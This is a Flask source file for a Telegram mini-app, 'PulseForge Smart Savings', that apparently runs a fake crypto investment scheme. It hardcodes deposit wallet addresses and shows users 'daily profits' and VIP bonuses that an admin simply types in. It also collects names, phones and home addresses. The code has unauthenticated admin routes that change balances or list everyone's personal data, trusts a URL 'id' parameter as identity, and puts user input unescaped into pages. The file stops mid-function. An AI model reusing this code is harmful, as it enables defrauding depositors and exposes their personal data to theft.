from flask import Flask, request
import sqlite3
from datetime import datetime, timedelta
import os

app = Flask(__name__)

def db():
    conn = sqlite3.connect("users.db")
    conn.row_factory = sqlite3.Row
    return conn

TRC = "TNWvYkycZFUfWzADKUQRjiZmRJWRhbU7Hm"
ERC = "0xFc9B81aa8e1921A2A4cd2ca7B46489c446F6c059"

ADMIN_ID = "8671125457"
BOT_USERNAME = "pulseofficialsbot"

def ui():
    return """
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();
    tg.setHeaderColor('#1a0f2e');
    const user = tg.initDataUnsafe?.user;
    if (window.location.pathname === '/' && user && !window.location.search.includes("id=")) {
        window.location.href = '/?id=' + user.id + '&username=' + (user.username || '') + '&first_name=' + encodeURIComponent(user.first_name || '');
    }
    </script>
    <style>
    body {background: linear-gradient(135deg, #1a0f2e, #2e0f4d); color: #e0f0ff; font-family: 'Inter', system-ui;}
    .diamond-glass {background: linear-gradient(145deg, rgba(139,92,246,0.22), rgba(139,92,246,0.08)); backdrop-filter: blur(35px); border: 2px solid rgba(139,92,246,0.6); box-shadow: 0 0 60px rgba(139,92,246,0.9), inset 0 0 35px rgba(255,255,255,0.5); border-radius: 28px;}
    .neon-purple {text-shadow: 0 0 30px #a855f7, 0 0 70px #a855f7, 0 0 100px #a855f7;}
    .neon-blue {text-shadow: 0 0 30px #22d3ee, 0 0 70px #22d3ee, 0 0 100px #22d3ee;}
    .btn {padding: 18px; border-radius: 9999px; text-align: center; display: block; font-weight: 700; transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); font-size: 1.15rem; box-shadow: 0 0 40px rgba(139,92,246,0.8);}
    .btn:hover {transform: scale(1.1); box-shadow: 0 0 65px rgba(139,92,246,1);}
    .glow {animation: glow 1.8s ease-in-out infinite alternate;}
    @keyframes glow { from {text-shadow: 0 0 20px #a855f7;} to {text-shadow: 0 0 70px #a855f7, 0 0 110px #a855f7;} }
    .profile-btn {background: linear-gradient(90deg, #22d3ee, #a855f7); color: #0f172a; box-shadow: 0 0 50px #a855f7; font-size: 1.3rem; font-weight: 800;}
    </style>
    """

def init_db():
    conn = db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id TEXT PRIMARY KEY, type TEXT, balance REAL DEFAULT 0,
                    profit REAL DEFAULT 0, total_profit REAL DEFAULT 0, vip_level INTEGER DEFAULT 0,
                    reward_balance REAL DEFAULT 0, reward_timestamp TEXT,
                    daily_profit_percent REAL DEFAULT 0,
                    last_daily_profit_timestamp TEXT,
                    username TEXT, first_name TEXT, name TEXT, email TEXT, phone TEXT, 
                    country_code TEXT, address TEXT, referral_code TEXT, registered INTEGER DEFAULT 0)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, user_id TEXT, message TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS support (id INTEGER PRIMARY KEY, user_id TEXT, username TEXT, sender TEXT, msg TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS deposits (id INTEGER PRIMARY KEY, user_id TEXT, amount REAL, network TEXT, txid TEXT, status TEXT, reason TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS withdraws (id INTEGER PRIMARY KEY, user_id TEXT, amount REAL, address TEXT, network TEXT, status TEXT, reason TEXT)''')
    
    for col, typ in [
        ("daily_profit_percent", "REAL DEFAULT 0"),
        ("last_daily_profit_timestamp", "TEXT"),
        ("name","TEXT"), ("email","TEXT"), ("phone","TEXT"), ("country_code","TEXT"),
        ("address","TEXT"), ("referral_code","TEXT"), ("registered","INTEGER DEFAULT 0")
    ]:
        try:
            c.execute(f"ALTER TABLE users ADD COLUMN {col} {typ}")
        except:
            pass
    conn.commit()
    conn.close()

init_db()

def get_vip_level(balance):
    if balance >= 50000: return 7
    if balance >= 20000: return 6
    if balance >= 10000: return 5
    if balance >= 5000: return 4
    if balance >= 2000: return 3
    if balance >= 1000: return 2
    if balance >= 500: return 1
    return 0

def get_vip_bonus(level):
    bonuses = {1:50, 2:100, 3:200, 4:500, 5:1000, 6:2000, 7:5000}
    return bonuses.get(level, 0)

def process_daily_profit(uid):
    conn = db()
    c = conn.cursor()
    c.execute("SELECT balance, daily_profit_percent, last_daily_profit_timestamp FROM users WHERE id=?", (uid,))
    user = c.fetchone()
    if not user or user['daily_profit_percent'] <= 0:
        conn.close()
        return
    last_time = user['last_daily_profit_timestamp']
    if last_time:
        last = datetime.fromisoformat(last_time)
        if datetime.now() - last < timedelta(hours=24):
            conn.close()
            return
    daily_amount = round(user['balance'] * (user['daily_profit_percent'] / 100), 2)
    if daily_amount > 0:
        c.execute("UPDATE users SET balance = balance + ?, total_profit = total_profit + ?, last_daily_profit_timestamp = ? WHERE id=?",
                  (daily_amount, daily_amount, datetime.now().isoformat(), uid))
    conn.commit()
    conn.close()

# ====================== REGISTRATION ======================
@app.route("/register")
def register():
    uid = request.args.get("id")
    return f"""{ui()}
    <div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center">
        <div class="diamond-glass p-8 rounded-3xl w-full">
            <div class="flex justify-center items-center gap-3 mb-6">
                <span class="text-6xl">🚀</span>
                <h1 class="text-4xl font-bold neon-purple glow">PulseForge Smart Savings</h1>
            </div>
            <form action="/register_submit" class="space-y-5">
                <input type="hidden" name="uid" value="{uid}">
                <input type="text" name="name" placeholder="Your Full Name" required class="w-full p-4 rounded-2xl bg-white/10 text-white placeholder:text-white/60 focus:outline-none focus:ring-2 focus:ring-purple-400">
                <input type="email" name="email" placeholder="Email Address" required class="w-full p-4 rounded-2xl bg-white/10 text-white placeholder:text-white/60 focus:outline-none focus:ring-2 focus:ring-purple-400">
                <div class="glass p-5 rounded-3xl">
                    <h3 class="text-blue-300 text-lg mb-4 text-center">Country Code</h3>
                    <input type="text" name="country_code" placeholder="Country Code (e.g. +1)" required class="w-full p-4 rounded-2xl bg-white/10 text-white placeholder:text-white/60 focus:outline-none focus:ring-2 focus:ring-purple-400">
                </div>
                <input type="tel" name="phone" placeholder="Phone Number" required class="w-full p-4 rounded-2xl bg-white/10 text-white placeholder:text-white/60 focus:outline-none focus:ring-2 focus:ring-purple-400">
                <textarea name="address" rows="2" placeholder="Full Address" required class="w-full p-4 rounded-2xl bg-white/10 text-white placeholder:text-white/60 focus:outline-none focus:ring-2 focus:ring-purple-400"></textarea>
                <input type="text" name="referral_code" placeholder="Referral Code (Optional)" class="w-full p-4 rounded-2xl bg-white/10 text-white placeholder:text-white/60 focus:outline-none focus:ring-2 focus:ring-purple-400">
                <div class="flex items-center gap-2">
                    <input type="checkbox" id="agree" required class="w-5 h-5 accent-purple-400">
                    <label for="agree" class="text-sm text-blue-200">I agree to the Terms and Conditions</label>
                </div>
                <button type="submit" class="btn w-full bg-gradient-to-r from-blue-500 to-purple-500 text-white neon-blue glow">Register Now</button>
            </form>
        </div>
    </div>
    """

@app.route("/register_submit")
def register_submit():
    uid = request.args.get("uid")
    name = request.args.get("name")
    email = request.args.get("email")
    country_code = request.args.get("country_code")
    phone = request.args.get("phone")
    address = request.args.get("address")
    referral_code = request.args.get("referral_code") or ""
    conn = db()
    c = conn.cursor()
    c.execute("""UPDATE users SET name=?, email=?, country_code=?, phone=?, address=?, referral_code=?, registered=1 WHERE id=?""", (name, email, country_code, phone, address, referral_code, uid))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="diamond-glass p-8 rounded-3xl"><h2 class="text-green-400 text-3xl mb-4">✅ Registration Successful!</h2><a href="/?id={uid}" class="btn bg-green-500 text-white">Go to Dashboard</a></div></div>"""

# ====================== HOME (Fixed) ======================
@app.route("/")
def home():
    uid = request.args.get("id")
    username = request.args.get("username") or ""
    first_name = request.args.get("first_name") or ""

    if not uid:
        return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass p-8 rounded-3xl"><h2 class="text-red-400 text-2xl mb-4">⚠️ Access Denied</h2><a href="https://t.me/{BOT_USERNAME}" target="_blank" class="btn bg-green-500 text-white text-lg">🚀 Start Bot Now</a></div></div>"""

    conn = db()
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE id=?", (uid,))
    user = c.fetchone()
    if not user:
        c.execute("INSERT INTO users (id, type, username, first_name) VALUES (?,?,?,?)", (uid, "user", username, first_name))
        conn.commit()
        c.execute("SELECT * FROM users WHERE id=?", (uid,))
        user = c.fetchone()

    process_daily_profit(uid)
    c.execute("SELECT * FROM users WHERE id=?", (uid,))
    user = c.fetchone()

    if user['balance'] < 0:
        c.execute("UPDATE users SET balance = 0 WHERE id=?", (uid,))
    if user['reward_balance'] < 0:
        c.execute("UPDATE users SET reward_balance = 0 WHERE id=?", (uid,))
    conn.commit()
    conn.close()

    if uid == ADMIN_ID:
        return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass p-8 rounded-3xl"><h2 class="text-blue-400 text-2xl mb-6">Welcome Admin!</h2><a href="/admin?id={uid}" class="btn bg-gradient-to-r from-purple-600 to-blue-600 text-white neon-purple text-2xl">Go to Admin Panel</a></div></div>"""

    if user['registered'] == 0:
        return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass p-8 rounded-3xl"><h2 class="text-blue-400 text-2xl mb-6">Welcome to PulseForge Smart Savings!</h2><a href="/register?id={uid}" class="btn bg-gradient-to-r from-blue-500 to-purple-500 text-white neon-blue text-xl">Complete Registration</a></div></div>"""

    # VIP Level Check
    current_vip = get_vip_level(user['balance'])
    if current_vip > user['vip_level']:
        bonus = get_vip_bonus(current_vip)
        now = datetime.now().isoformat()
        conn = db()
        c = conn.cursor()
        c.execute("UPDATE users SET vip_level=?, reward_balance=reward_balance+?, reward_timestamp=? WHERE id=?", (current_vip, bonus, now, uid))
        c.execute("INSERT INTO messages VALUES(NULL,?,?)", (uid, f"Congratulations! You are now VIP {current_vip} - {bonus} USDT reward added!"))
        conn.commit()
        conn.close()

    # Reward Balance Auto Add
    if user['reward_timestamp'] and user['reward_balance'] > 0:
        reward_time = datetime.fromisoformat(user['reward_timestamp'])
        if datetime.now() - reward_time >= timedelta(hours=24):
            conn = db()
            c = conn.cursor()
            c.execute("UPDATE users SET balance=balance+?, reward_balance=0, reward_timestamp=NULL WHERE id=?", (user['reward_balance'], uid))
            c.execute("INSERT INTO messages VALUES(NULL,?,?)", (uid, f"{user['reward_balance']} USDT Reward Balance has been added to your Main Balance!"))
            conn.commit()
            conn.close()

    # Get Messages for badge
    conn = db()
    c = conn.cursor()
    c.execute("SELECT message FROM messages WHERE user_id=?", (uid,))
    msgs = c.fetchall()
    conn.close()

    badge = f'<span class="ml-auto bg-red-500 text-white text-xs font-bold px-3 py-1 rounded-full">{len(msgs)}</span>' if msgs else ''
    admin_html = f'<a href="/admin?id={uid}" class="block mt-6 mx-5 bg-gradient-to-r from-purple-600 to-blue-600 text-white text-center py-6 rounded-3xl font-bold text-2xl shadow-2xl neon-purple">🔐 Admin Panel</a>' if uid == ADMIN_ID else ''

    daily_amount = round(user['balance'] * (user['daily_profit_percent'] / 100), 2)

    html = f"""{ui()}
    <div class="max-w-md mx-auto p-5 min-h-screen">
    <div class="flex justify-center items-center gap-3 mb-6"><span class="text-5xl">🚀</span><h1 class="text-4xl font-bold neon-purple glow">PulseForge Smart Savings</h1></div>
    <div class="glass p-8 text-center mb-8"><h2 class="text-white/70 text-sm tracking-widest mb-1">BALANCE</h2><h1 class="text-6xl font-bold neon-purple">{max(0, user['balance']):.2f} USD</h1></div>
    <div class="glass p-6 mb-8">
        <div class="flex justify-between text-lg mb-3"><div>📈 <strong>Daily Profit</strong></div><div class="text-emerald-400 font-semibold">{daily_amount:.2f} USD</div></div>
        <div class="flex justify-between text-lg mb-3"><div>💰 <strong>Total Profit</strong></div><div class="text-emerald-400 font-semibold">{user['total_profit']:.2f} USD</div></div>
        <div class="flex justify-between text-lg"><div>🌟 <strong>Reward Balance</strong></div><div class="text-purple-400 font-semibold">{max(0, user['reward_balance']):.2f} USD</div></div>
    </div>
    <a href="/profile?id={uid}" class="profile-btn btn neon-blue text-xl mb-4">👤 Profile</a>
    <a href='/deposit?id={uid}' class='btn bg-gradient-to-r from-yellow-500 to-amber-500 text-white neon-blue text-lg mb-3'>Deposit</a>
    <a href='/withdraw?id={uid}' class='btn bg-gradient-to-r from-red-500 to-rose-600 text-white neon-blue text-lg mb-3'>Withdraw</a>
    <a href='/support?id={uid}&username={username}' class='btn bg-gradient-to-r from-blue-500 to-cyan-500 text-white neon-blue text-lg mb-3'>Support</a>
    
    <div onclick="openMessagesModal()" class="glass p-5 mt-8 flex items-center justify-between cursor-pointer hover:bg-white/10">
        <h3 class="text-blue-400 text-xl flex items-center gap-2">📩 Messages</h3>{badge}
    </div>
    
    <div onclick="openVipModal()" class="glass p-5 mt-4 flex items-center justify-between cursor-pointer hover:bg-white/10">
        <h3 class="text-blue-400 text-xl flex items-center gap-2">🌟 VIP System</h3><span class="text-cyan-400">→</span>
    </div>
    {admin_html}
    </div>

    <!-- Messages Modal -->
    <div id="messagesModal" onclick="if(event.target===this)closeMessagesModal()" class="hidden fixed inset-0 bg-black/90 flex items-end z-[9999]">
      <div onclick="event.stopImmediatePropagation()" class="diamond-glass w-full max-w-md mx-auto rounded-3xl max-h-[88vh] overflow-hidden flex flex-col shadow-2xl mb-3">
        <div class="w-14 h-1.5 bg-gray-400 rounded-full mx-auto mt-4 mb-1"></div>
        <div class="px-6 pb-4 text-center text-xl font-semibold">Messages</div>
        <div class="flex-1 overflow-y-auto px-5 pb-5 space-y-4">
            {''.join([f'<div class="glass p-4"><strong>From Admin/Support:</strong><br>{m[0]}</div>' for m in msgs]) or '<div class="text-center text-gray-400 py-10">No messages yet</div>'}
        </div>
        <div class="p-4 border-t border-gray-700">
            <button onclick="markAsRead()" class="btn bg-green-500 text-white w-full">Mark All as Read</button>
        </div>
      </div>
    </div>

    <!-- VIP Modal -->
    <div id="vipModal" onclick="if(event.target===this)closeVipModal()" class="hidden fixed inset-0 bg-black/90 flex items-end z-[9999]">
      <div onclick="event.stopImmediatePropagation()" class="diamond-glass w-full max-w-md mx-auto rounded-3xl max-h-[88vh] overflow-hidden flex flex-col shadow-2xl mb-3">
        <div class="w-14 h-1.5 bg-gray-400 rounded-full mx-auto mt-4 mb-1"></div>
        <div class="px-6 pb-4 text-center text-xl font-semibold">🎁 VIP Rewards Program</div>
        <div class="flex-1 overflow-y-auto px-6 pb-6 space-y-6 text-white text-sm">
          <div class="text-center text-blue-300 text-lg font-bold">Upgrade your VIP level to earn more rewards!</div>
          <div>🌟 <strong>VIP1</strong> - 500 USDT (50 USDT reward)</div>
          <div>🌟 <strong>VIP2</strong> - 1000 USDT (100 USDT reward)</div>
          <div>🌟 <strong>VIP3</strong> - 2000 USDT (200 USDT reward)</div>
          <div>🌟 <strong>VIP4</strong> - 5000 USDT (500 USDT reward)</div>
          <div>🌟 <strong>VIP5</strong> - 10000 USDT (1000 USDT reward)</div>
          <div>🌟 <strong>VIP6</strong> - 20000 USDT (2000 USDT reward)</div>
          <div>🌟 <strong>VIP7</strong> - 50000 USDT (5000 USDT reward)</div>
        </div>
      </div>
    </div>

    <script>
    function openMessagesModal() {{ 
        document.getElementById('messagesModal').classList.remove('hidden'); 
        document.getElementById('messagesModal').classList.add('flex'); 
    }}
    function closeMessagesModal() {{ 
        document.getElementById('messagesModal').classList.add('hidden'); 
        document.getElementById('messagesModal').classList.remove('flex'); 
    }}
    function openVipModal() {{ 
        document.getElementById('vipModal').classList.remove('hidden'); 
        document.getElementById('vipModal').classList.add('flex'); 
    }}
    function closeVipModal() {{ 
        document.getElementById('vipModal').classList.add('hidden'); 
        document.getElementById('vipModal').classList.remove('flex'); 
    }}
    
    function markAsRead() {{
        const uid = new URLSearchParams(window.location.search).get('id');
        fetch('/clear_messages?id=' + uid)
            .then(() => {{
                closeMessagesModal();
                location.reload();
            }})
            .catch(() => location.reload());
    }}
    </script>
    """
    return html

# ====================== CLEAR MESSAGES ======================
@app.route("/clear_messages")
def clear_messages():
    uid = request.args.get("id")
    if uid:
        conn = db()
        c = conn.cursor()
        c.execute("DELETE FROM messages WHERE user_id = ?", (uid,))
        conn.commit()
        conn.close()
    return "OK"

# ====================== PROFILE ======================
@app.route("/profile")
def profile():
    uid = request.args.get("id")
    conn = db()
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE id=?", (uid,))
    user = c.fetchone()
    conn.close()

    daily_amount = round(user['balance'] * (user['daily_profit_percent'] / 100), 2)

    html = f"""{ui()}
    <div class="max-w-md mx-auto p-5 min-h-screen">
        <div class="diamond-glass p-8 rounded-3xl">
            <h2 class="text-blue-400 text-3xl text-center mb-8 neon-purple">👤 Profile Summary</h2>
            <div class="space-y-6 text-lg">
                <div class="flex justify-between"><span class="text-white/80">Main Balance</span><span class="text-blue-300 font-bold">{max(0, user['balance']):.2f} USD</span></div>
                <div class="flex justify-between"><span class="text-white/80">Daily Profit</span><span class="text-emerald-400 font-bold">{daily_amount:.2f} USD</span></div>
                <div class="flex justify-between"><span class="text-white/80">Total Profit</span><span class="text-emerald-400 font-bold">{user['total_profit']:.2f} USD</span></div>
                <div class="flex justify-between"><span class="text-white/80">Reward Balance</span><span class="text-purple-400 font-bold">{max(0, user['reward_balance']):.2f} USD</span></div>
                <div class="flex justify-between"><span class="text-white/80">VIP Level</span><span class="text-purple-400 font-bold">VIP {user['vip_level']}</span></div>
                <div class="flex justify-between"><span class="text-white/80">Daily Profit %</span><span class="text-teal-400 font-bold">{user['daily_profit_percent']}%</span></div>
            </div>
        </div>
        <a href="/?id={uid}" class="btn bg-gray-500 text-white mt-10">← Back to Home</a>
    </div>
    """
    return html

# ====================== MANAGE ======================
@app.route("/manage")
def manage():
    uid = request.args.get("uid")
    return f"""{ui()}<div class="max-w-md mx-auto p-4"><h2 class="text-blue-400 text-center text-xl mb-6">Manage User {uid}</h2>
    <div class="glass p-6"><form action='/add'><input type='hidden' name='uid' value='{uid}'><input name='amount' placeholder='Add Main Balance' class='text-black w-full p-3 rounded mb-3'><button class='btn bg-green-500 w-full'>Add Main Balance</button></form></div>
    <div class="glass mt-3 p-6"><form action='/add_reward'><input type='hidden' name='uid' value='{uid}'><input name='amount' placeholder='Add Reward Balance' class='text-black w-full p-3 rounded mb-3'><button class='btn bg-purple-500 w-full'>Add Reward Balance</button></form></div>
    <div class="glass mt-3 p-6"><form action='/remove_reward'><input type='hidden' name='uid' value='{uid}'><input name='amount' placeholder='Remove Reward Balance' class='text-black w-full p-3 rounded mb-3'><button class='btn bg-red-500 w-full'>Remove Reward Balance</button></form></div>
    <div class="glass mt-3 p-6"><form action='/remove'><input type='hidden' name='uid' value='{uid}'><input name='amount' placeholder='Remove Main Balance' class='text-black w-full p-3 rounded mb-3'><button class='btn bg-red-500 w-full'>Remove Main Balance</button></form></div>
    <div class="glass mt-3 p-6"><form action='/profit'><input type='hidden' name='uid' value='{uid}'><input name='p' placeholder='Profit % (e.g. 5)' class='text-black w-full p-3 rounded mb-3'><button class='btn bg-blue-500 w-full'>Add Profit %</button></form></div>
    <div class="glass mt-3 p-6"><form action='/set_daily_profit'><input type='hidden' name='uid' value='{uid}'><input name='percent' placeholder='Daily Profit % (e.g. 2.5)' class='text-black w-full p-3 rounded mb-3'><button class='btn bg-teal-500 w-full'>Set Daily Profit %</button></form></div>
    <div class="glass mt-3 p-6"><form action='/msg'><input type='hidden' name='uid' value='{uid}'><textarea name='m' placeholder="Type message for user..." rows="3" class='text-black w-full p-3 rounded mb-3'></textarea><button class='btn bg-blue-500 text-white w-full'>Send Message</button></form></div></div>"""

@app.route("/set_daily_profit")
def set_daily_profit():
    uid = request.args.get("uid")
    percent = float(request.args.get("percent", 0))
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE users SET daily_profit_percent=? WHERE id=?", (percent, uid))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Daily Profit {percent}% Set</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/remove_reward")
def remove_reward():
    uid = request.args.get("uid")
    amount = float(request.args.get("amount", 0))
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE users SET reward_balance = reward_balance - ? WHERE id=?", (amount, uid))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ {amount} USD Removed from Reward</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/add")
def add():
    uid = request.args.get("uid")
    amount = float(request.args.get("amount", 0))
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE users SET balance = balance + ? WHERE id=?", (amount, uid))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ {amount} USD Added</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/add_reward")
def add_reward():
    uid = request.args.get("uid")
    amount = float(request.args.get("amount", 0))
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE users SET reward_balance = reward_balance + ? WHERE id=?", (amount, uid))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ {amount} USD Added to Reward</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/remove")
def remove():
    uid = request.args.get("uid")
    amount = float(request.args.get("amount", 0))
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE users SET balance = balance - ? WHERE id=?", (amount, uid))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ {amount} USD Removed</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/profit")
def profit():
    uid = request.args.get("uid")
    percent = float(request.args.get("p", 0))
    conn = db()
    c = conn.cursor()
    c.execute("UPDATE users SET total_profit = total_profit + (balance * ? / 100) WHERE id=?", (percent, uid))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ {percent}% Profit Added</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/msg")
def msg():
    uid = request.args.get("uid")
    message = request.args.get("m", "")
    conn = db()
    c = conn.cursor()
    c.execute("INSERT INTO messages VALUES(NULL,?,?)", (uid, message))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Message Sent</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/support")
def support():
    uid = request.args.get("id")
    username = request.args.get("username") or "unknown"
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen"><div class="glass p-8 rounded-3xl"><h2 class="text-blue-400 text-2xl text-center mb-6">📩 Support</h2><form action='/send_support'><input type='hidden' name='uid' value='{uid}'><input type='hidden' name='username' value='{username}'><textarea name='msg' rows="5" placeholder='Type your message here...' class='text-black w-full p-4 rounded-2xl mb-6'></textarea><button class='btn bg-gradient-to-r from-blue-500 to-purple-500 text-white'>Send to Admin</button></form></div></div>"""

@app.route("/send_support")
def send_support():
    uid = request.args.get("uid")
    username = request.args.get("username") or "unknown"
    msg = request.args.get("msg")
    conn = db()
    c = conn.cursor()
    c.execute("INSERT INTO support VALUES(NULL,?,?,?,?)", (uid, username, "user", msg))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Support Sent</h2><a href="/?id={uid}" class="btn bg-green-500 text-white">Back to Home</a></div></div>"""

# ====================== ADMIN PANEL ======================
@app.route("/admin")
def admin():
    uid = request.args.get("id")
    if uid != ADMIN_ID:
        return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass p-8 rounded-3xl"><h2 class="text-red-400 text-3xl mb-4">🚫 Access Denied</h2><p class="text-xl">Only Admin can access this panel.</p></div></div>"""

    conn = db()
    c = conn.cursor()
    c.execute("SELECT id, username, first_name, balance FROM users")
    users = c.fetchall()
    c.execute("SELECT * FROM support")
    sup = c.fetchall()
    c.execute("SELECT COUNT(*) FROM deposits WHERE status='pending'")
    pending_dep = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM withdraws WHERE status='pending'")
    pending_wd = c.fetchone()[0]
    conn.close()

    badge_support = f'<span class="ml-auto bg-red-500 text-white text-xs font-bold px-3 py-1 rounded-full">{len(sup)}</span>' if sup else ''
    badge_dep = f'<span class="ml-auto bg-red-500 text-white text-xs font-bold px-3 py-1 rounded-full">{pending_dep}</span>' if pending_dep > 0 else ''
    badge_wd = f'<span class="ml-auto bg-red-500 text-white text-xs font-bold px-3 py-1 rounded-full">{pending_wd}</span>' if pending_wd > 0 else ''

    user_list_html = "".join([f"""<div class="glass p-4 rounded-2xl flex justify-between items-center"><div><span class="font-medium text-white">@{u['username'] or u['first_name'] or u['id']}</span><br><span class="text-emerald-400 text-sm">{u['balance']:.2f} USD</span></div><a href='/manage?uid={u['id']}' class="text-blue-400 font-medium">Manage</a></div>""" for u in users])

    support_html = "".join([f"""<div class="glass p-5"><p><strong>From:</strong> @{s['username']} (ID: {s['user_id']})</p><p class="mt-2">{s['msg']}</p><form action='/reply_support' class="mt-4"><input type='hidden' name='uid' value='{s['user_id']}'><input name='reply' placeholder="Reply..." class='text-black w-full p-3 rounded mb-3'><button class='btn bg-blue-500 w-full'>Send Reply</button></form></div>""" for s in sup])

    html = f"""{ui()}
    <div class="max-w-md mx-auto p-4">
    <div class="text-center py-4 bg-red-600 text-white text-xl font-bold mb-6 rounded-3xl">🚀 Admin Panel</div>
    <h2 class="text-blue-400 text-center text-3xl mb-6 glow">🔐 Admin Panel</h2>
    <a href='/all_user_info' class='btn bg-gradient-to-r from-blue-500 to-purple-500 text-white neon-blue text-lg flex justify-between items-center mb-4'>👥 All User Info</a>
    <a href='/deposits' class='btn bg-gradient-to-r from-blue-500 to-purple-500 text-white neon-blue text-lg flex justify-between items-center'>Pending Deposits {badge_dep}</a>
    <a href='/withdraws' class='btn bg-gradient-to-r from-red-500 to-rose-600 text-white neon-blue text-lg flex justify-between items-center'>Pending Withdraws {badge_wd}</a>
    <div class="glass mt-6 p-6"><h3 class="text-blue-400 mb-3">Broadcast to All Users</h3><form action='/broadcast'><textarea name='m' placeholder="Type message here..." rows="4" class='text-black w-full p-3 rounded mb-3'></textarea><button class='btn bg-blue-500 w-full'>Send Broadcast</button></form></div>
    <div class="glass mt-4 p-6"><h3 class="text-blue-400 mb-3">All Users</h3><div class="space-y-3">{user_list_html}</div></div>
    <div onclick="openSupportModal()" class="glass mt-4 p-5 flex items-center justify-between cursor-pointer hover:bg-white/10"><h3 class="text-blue-400 text-lg flex items-center gap-2">📩 Support Inbox</h3>{badge_support}</div>
    </div>
    <div id="supportModal" onclick="if(event.target===this)closeSupportModal()" class="hidden fixed inset-0 bg-black/90 flex items-end z-[9999]">
      <div onclick="event.stopImmediatePropagation()" class="diamond-glass w-full max-w-md mx-auto rounded-3xl max-h-[88vh] overflow-hidden flex flex-col shadow-2xl mb-3">
        <div class="w-14 h-1.5 bg-gray-400 rounded-full mx-auto mt-4 mb-1"></div>
        <div class="px-6 pb-4 text-center text-xl font-semibold">Support Inbox</div>
        <div class="flex-1 overflow-y-auto px-5 pb-5 space-y-4">{support_html or '<div class="text-center text-gray-400 py-10">No support messages yet</div>'}</div>
      </div>
    </div>
    <script>
    function openSupportModal() {{ document.getElementById('supportModal').classList.remove('hidden'); document.getElementById('supportModal').classList.add('flex'); }}
    function closeSupportModal() {{ document.getElementById('supportModal').classList.add('hidden'); document.getElementById('supportModal').classList.remove('flex'); }}
    </script>
    """
    return html

@app.route("/all_user_info")
def all_user_info():
    conn = db()
    c = conn.cursor()
    c.execute("SELECT id, name, email, phone, country_code, address, referral_code, balance FROM users WHERE registered=1")
    users = c.fetchall()
    conn.close()
    user_html = "".join([f"""<div class="glass p-5 mb-4"><p><strong>ID:</strong> {u['id']}</p><p><strong>Name:</strong> {u['name'] or 'N/A'}</p><p><strong>Email:</strong> {u['email'] or 'N/A'}</p><p><strong>Phone:</strong> {u['phone'] or 'N/A'}</p><p><strong>Address:</strong> {u['address'] or 'N/A'}</p><p><strong>Balance:</strong> {u['balance']:.2f} USD</p></div>""" for u in users])
